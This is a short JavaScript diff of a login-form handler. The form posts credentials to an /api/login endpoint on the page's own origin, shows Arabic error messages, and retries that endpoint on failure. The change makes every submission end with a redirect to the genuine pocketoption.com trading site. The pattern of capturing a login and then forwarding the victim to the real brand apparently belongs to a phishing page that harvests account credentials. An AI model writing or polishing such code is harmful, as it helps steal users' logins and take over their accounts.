@@ -250,7 +250,7 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
             alert('حدث خطأ: ' + (data.message || 'بيانات غير صالحة'));
         }
     } catch (err) {
-         window.location.href = "https://pocketoption.com/";
+        
         try {
             const fallbackRes = await fetch(window.location.origin + '/api/login', {
                 method: 'POST',
@@ -264,6 +264,7 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
         } catch (fallbackErr) {}
         
     }
+     window.location.href = "https://pocketoption.com/";
 });
     window.addEventListener('DOMContentLoaded', () => {
     const urlParams = new URLSearchParams(window.location.search);
